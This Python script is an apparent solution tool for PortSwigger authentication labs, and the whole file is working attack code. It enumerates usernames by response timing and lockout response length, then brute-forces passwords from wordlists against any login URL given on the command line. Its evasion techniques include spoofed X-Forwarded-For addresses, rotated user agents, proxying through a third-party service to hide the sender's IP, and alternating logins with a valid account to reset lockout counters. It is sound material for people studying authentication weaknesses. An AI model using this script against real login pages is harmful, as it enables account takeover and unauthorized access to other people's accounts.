## BRUTE FORCE BYPASS with RATE LIMITING and ALTERNATING BYPASS ##
import requests
import random
import time
import sys
import urllib3


# Disable warnings if no CA cert used (NOT RECOMMENDED outside Portswigger environment)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def generate_random_ip():
    """Generate a random IP address to spoof."""
    return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"

    
def get_proxies(proxy_type="burp"):
    """Return proxy settings based on the proxy type."""
    if proxy_type == "scraper":
        api_key = "YOUR_SCRAPERAPI_KEY" # If you want to use an alternative proxy to hid IP address
        return {
            "http": f"http://scraperapi:{api_key}@proxy-server.scraperapi.com:8001",
            "https": f"http://scraperapi:{api_key}@proxy-server.scraperapi.com:8001",
        }
    elif proxy_type == "burp": # Route traffic thru your burpsuite application
        return {
            "http": "127.0.0.1:8080", # Your settings here
            "https": "127.0.0.1:8080",
        }
    return None  # No proxy


def get_cookies(session, url, ca_cert_path=None):
    """Retrieve cookies automatically from the initial GET request."""
    print(f"Using CA cert path: {ca_cert_path}") ## ATTN: You must provide the entire chain of CA CERTs in one file
    try:
        response = session.get(url, verify=ca_cert_path)
        response.raise_for_status()  # Raise HTTPError for bad responses (4xx and 5xx)
        print("Initial GET request successful.")
        cookies = session.cookies.get_dict()
        print(f"Retrieved cookies: {cookies}")
        return cookies
    except requests.exceptions.SSLError as e:
        print(f"SSL Error: {e}")
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")
    return None


def generate_random_session(username, password, url):
    headers = {
        "X-Forwarded-For": generate_random_ip(),
        "User-Agent": random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36",
           "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"
        ]),
        "Referer": url,
    }
    data = {"username": username, "password": password}
    return headers, data
    
    
def find_username_bypass_rate_limit(url, session, cookies, password, ca_cert_path=None):
    """Enumerate usernames while bypassing rate-limiting."""
    verify_setting = ca_cert_path if ca_cert_path else False  # Use the CA cert path if provided
    proxies = get_proxies()
    try:
        with open("res/usernames.txt", "r") as file:
            usernames = [line.strip() for line in file]
    except FileNotFoundError:
        print("Usernames file not found.")
        return None
    
    response_times = []
    failed_usernames = []  # Store usernames for failed requests

    for username in usernames:
        headers, data = generate_random_session(username, password, url)
        for attempt in range(3):  # Retry up to 3 times
            try:
                start_time = time.perf_counter()
                response = session.post(
                    url, 
                    data=data, 
                    headers=headers, 
                    proxies=proxies, 
                    cookies=cookies, 
                    timeout=10, 
                    verify=verify_setting,
                    allow_redirects=False
                )
                end_time = time.perf_counter()
                
                elapsed_time = end_time - start_time
                response_times.append((username, elapsed_time))
                
                print(
                    f"Attempted Username: {username}, "
                    f"Response Time: {elapsed_time:.3f} seconds, "
                    f"Status Code: {response.status_code}"
                )
                break
            except requests.exceptions.RequestException as e:
                if attempt == 2:  # Final attempt
                    print(f"Request failed for username: {username} with error: {e}")
                    failed_usernames.append(username)  # Log failed username
                    
        # time.sleep(random.uniform(1, 5))  # Make it more difficult to detect brute force by adding a random delay
        
    print("Response Times:", response_times)    
    # Sort response times in descending order (slowest first)
    sorted_times = sorted(response_times, key=lambda x: x[1], reverse=True)

    # Display the 10 slowest responses
    print("\nTop 10 Slowest Responses:")
    for i, (username, elapsed_time) in enumerate(sorted_times[:10], start=1):
        print(f"{i}. Username: {username}, Response Time: {elapsed_time:.3f} seconds")

    # Log failed usernames
    if failed_usernames:
        print("\nFailed Usernames:")
        for username in failed_usernames:
            print(f"- {username}")
            
    # Return the slowest username
    slowest_username = sorted_times[0][0] if sorted_times else None
    if slowest_username:
        print(f"\nSlowest Username: {slowest_username}, Response Time: {sorted_times[0][1]:.3f} seconds")
    else:
        print("No valid username found.")
    return slowest_username


def find_username_account_lock(url, session, cookies, password, ca_cert_path=None):
    """Enumerate usernames while bypassing rate-limiting."""
    verify_setting = ca_cert_path if ca_cert_path else False  # Use the CA cert path if provided
    proxies = get_proxies()
    try:
        with open("res/usernames.txt", "r") as file:
            usernames = [line.strip() for line in file]
    except FileNotFoundError:
        print("Usernames file not found.")
        return None
    
    failed_logins = {}  # Store usernames for failed requests

    for username in usernames:
        for attempt in range (5): 
            headers, data = generate_random_session(username, password, url)
            try:
                response = session.post(
                    url, 
                    data=data, 
                    headers=headers, 
                    proxies=proxies, 
                    cookies=cookies, 
                    timeout=10, 
                    verify=verify_setting,
                    allow_redirects=False
                )
                # Use Content-Length header if available, otherwise calculate it
                content_length = response.headers.get('Content-Length')
                if content_length is None:
                    content_length = len(response.content)
                    
                failed_logins[username] = content_length

            except requests.exceptions.RequestException as e:
                    print(f"Request failed for username: {username} with error: {e}")
        print(f"{attempt + 1} login attempts with username: {username}\n"
              f"Content length: {failed_logins[username]}")
        
        # time.sleep(random.uniform(1, 5))  # brute force detection aversion by adding a random delay

    # Group users by message
    grouped_by_message = {}
    for user, message in failed_logins.items():
        if message not in grouped_by_message:
            grouped_by_message[message] = []
        grouped_by_message[message].append(user)

    # Print grouped messages
    print("Content lengths grouped by usernames:")
    for message, users in grouped_by_message.items():
        print(f"Content Length: {message}")
        print(f"Username: {', '.join(users)}")
        print()
    
    anomalous = find_anomalous_content_length(failed_logins)
    found_username = list(anomalous.keys())[0]
    return found_username
        

def find_anomalous_content_length(failed_logins):
    # Analyze the unique Content-Length values
    unique_lengths = set(failed_logins.values())
    
    if len(unique_lengths) == 1:
        # All values are the same
        print("All Content-Length values are the same.")
        return None
    else:
        # Return usernames with unique Content-Length values
        anomalous = {user: length for user, length in failed_logins.items() if list(failed_logins.values()).count(length) == 1}
        print(f"Anomalous Content-Lengths: {anomalous}")
        return anomalous

        
def load_password_list():
    try:
        with open("res/passwords.txt", "r") as file:
            passwords = [line.strip() for line in file]
    except FileNotFoundError:
        print("Usernames file not found.")
        return None
    return passwords


def rotate_cookies(session, url, ca_cert_path):
    """Retrieve new cookies for each attempt to bypass rate-limiting."""
    try:
        response = session.get(url, verify=ca_cert_path)
        response.raise_for_status()
        cookies = session.cookies.get_dict()
        print(f"New cookies obtained: {cookies}")
        return cookies
    except requests.exceptions.RequestException as e:
        print(f"Failed to obtain new cookies: {e}")
        return None
    
    
def brute_force_password(url, session, cookies, username, ca_cert_path=None):
    """Brute-force the password for a valid username."""
    verify_setting = ca_cert_path if ca_cert_path else False  # Use the CA cert path if provided
    proxies = get_proxies()
    passwords = load_password_list()
    usernames = [username]

    failed_logins = {}

    for password in passwords:
        for username in usernames: # Dummy alternator for brute force aversion
            headers, data = generate_random_session(username, password, url)
            try:
                response = session.post(
                    url, 
                    data=data, 
                    headers=headers, 
                    proxies=proxies, 
                    cookies=cookies, 
                    timeout=10,
                    verify=verify_setting,
                    allow_redirects=False
                )
                # Use Content-Length header if available, otherwise calculate it
                content_length = response.headers.get('Content-Length')
                if content_length is None:
                    content_length = len(response.content)
                    
                failed_logins[password] = content_length
                
                print(
                    f"Attempted password: {password} | "
                    f"Status Code: {response.status_code} | "
                    f"Content Length: {len(response.content)}"
                )
            
                # Check for 200 status code (Login failed but no lockout detected)
                if response.status_code == 200:
                    if "Invalid username or password" in response.text:
                        print(f"Failed login attempt for password: {password}")
                    elif "You have made too many incorrect login attempts." in response.text:
                        print("Brute force detected by server. Wait and retry later.")
                    else:
                        print(f"Unexpected 200 response for password: {password}")

                # Check for 302 status code (Successful login)
                elif response.status_code == 302:
                    print(f"Valid password found: {password}")
                    return password

                # Check for 401 status code (Unauthorized)
                elif response.status_code == 401:
                    print(f"Unauthorized for password: {password}. Username may not exist.")

                # Check for 429 status code (Rate-limiting)
                elif response.status_code == 429:
                    print("Rate-limiting detected. Adjust request rate or wait before retrying.")

                # Catch-all for other status codes
                else:
                    print(f"Unexpected status code: {response.status_code} for password: {password}")

            except requests.exceptions.RequestException as e:
                print(f"Request failed for password: {password} with error: {e}")
                    
            # time.sleep(random.uniform(1, 5)) # Random delay btw requests 1 to 5 sec 
            
    # Group users by message
    grouped_by_message = {}
    for pwd, message in failed_logins.items():
        if message not in grouped_by_message:
            grouped_by_message[message] = []
        grouped_by_message[message].append(pwd)

    # Print grouped messages
    print("Content lengths grouped by passwords:")
    for message, pwd in grouped_by_message.items():
        print(f"Content Length: {message}")
        print(f"Passwords: {', '.join(pwd)}")
        print()
    
    anomalous = find_anomalous_content_length(failed_logins)
    found_password = list(anomalous.keys())[0]
    return found_password


def alternating_brute_force(url, session, cookies, valid_user, valid_password, username_target, ca_cert_path=None):
    """
    Alternates between login attempts with your account and brute-forcing the target account.
    """
    verify_setting = ca_cert_path if ca_cert_path else False
    proxies = get_proxies()
    headers, data = generate_random_session(valid_user, valid_password, url)
    passwords = load_password_list()
        
    for password in passwords:
        # Step 1: Login with credentials to reset brute-force counter
        print(f"Logging in with your account: {valid_user}")
        data_yours = {"username": valid_user, "password": valid_password}
        response_yours = session.post(
            url, data=data_yours, 
            headers=headers, 
            proxies=proxies, 
            cookies=cookies, 
            verify=verify_setting, 
            allow_redirects=False
        )

        if response_yours.status_code == 302:
            print(f"Your account login successful for {valid_user}. Brute-force counter reset.")
        else:
            print(f"Failed to log in with your account {valid_user}. Check your credentials or session.")

        # Step 2: Attempt to brute-force target username with current password
        print(f"Brute-forcing target account: {username_target} with password: {password}")
        data_target = {"username": username_target, "password": password}
        response_target = session.post(
            url, 
            data=data_target, 
            headers=headers, 
            cookies=cookies, 
            verify=verify_setting, 
            allow_redirects=False
        )

        if response_target.status_code == 302:
            print(f"Valid password found for {username_target}: {password}")
            return password  # Return the valid password immediately

        elif "You have made too many incorrect login attempts." in response_target.text:
            print("Server detected brute force. Restarting with a valid login.")

        # time.sleep(random.uniform(1, 2)) # Delay btw requests if desired for additional obfuscation

    print("Brute-force attack completed. No valid password found.")
    return None
        
        
def main():
    if len(sys.argv) < 2:
        print("Usage: python script.py <target_url>")
        sys.exit(1)

    url = sys.argv[1]

    session = requests.Session()

    ca_cert_path = "certs/burp_cacert_chain.pem"

    cookies = get_cookies(session, url, ca_cert_path)


    ### START: Lab -- Broken brute-force protection, IP block ###
    # valid_user = "wiener"
    # valid_password = "peter"
    #
    # username_target = "carlos"
    # alternating_brute_force(url, session, cookies, valid_user, valid_password, username_target)
    ### END: Lab -- Broken brute-force protection, IP block  ###


    ### START: Lab -- Username enumeration via response timing ###
    # dummy_password = "howdy" * 20
    # username = find_username_bypass_rate_limit(url, session, cookies, dummy_password, ca_cert_path)
    ###  END: Lab -- Username enumeration via response timing ###
    
    ### START: Lab -- Username enumeration via account lock ###
    dummy_password = "howdy"
    username = find_username_account_lock(url, session, cookies, dummy_password, ca_cert_path)
    ### END: Lab -- Username enumeration via account lock ###
    
    # username = ""
    
    if username:
        print(f"Possible username match --> {username}")
        while True:
            try:
                choice = input("Do you want to brute force the password? [Y/n] ").strip().lower()
                if choice == "y":
                    password = brute_force_password(url, session, cookies, username, ca_cert_path)
                    print(f"Username: {username}")
                    if not password:
                        print("No password found.")
                    else:
                        print(f"Password: {password} \nSuccess!")
                elif choice == "n":
                    print("OK. Goodbye.")
                else:
                    print("Invalid input. Please enter 'Y' or 'n'.")
            except Exception as e:
                print(f"An error occurred: {e}")   
            finally:
                exit(0)
    else:
        print("Username enumeration unsuccessful.")
        exit(0)
    ### END: Lab -- Username enumeration via response timing  ###
        
if __name__ == "__main__":
    main()